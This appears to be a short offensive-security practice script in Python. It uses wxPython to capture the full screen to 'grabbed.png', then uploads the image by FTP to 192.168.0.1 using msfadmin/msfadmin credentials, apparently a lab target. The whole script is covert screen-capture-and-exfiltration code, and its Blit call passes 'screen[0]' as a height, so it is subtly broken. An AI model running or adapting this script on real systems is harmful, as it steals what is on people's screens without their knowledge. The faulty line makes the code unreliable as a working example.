#wx help create gui interfaces
import wx 
import os
import ftplib

w= wx.App()
#enabling the screen method
screen = wx.ScreenDC()
#create an empty bitmap for the size of the screen
size = screen.GetSize()
bmap = wx.Bitmap(size[0],size[1])
memo = wx.MemoryDC(bmap)
# 0s are x and y
memo.Blit(0,0,size[0],screen[0])

del memo
bmap.SaveFile("grabbed.png",wx.BITMAP_TYPE_PNG)

sess_ = ftplib.FTP("192.168.0.1", "msfadmin","msfadmin")
file_ = open("grabbed.png", "rb")
sess_.storbinary("STOR /tmp/grabbed.png", file_)
#always close file and session

file_.close()
sess_.quit()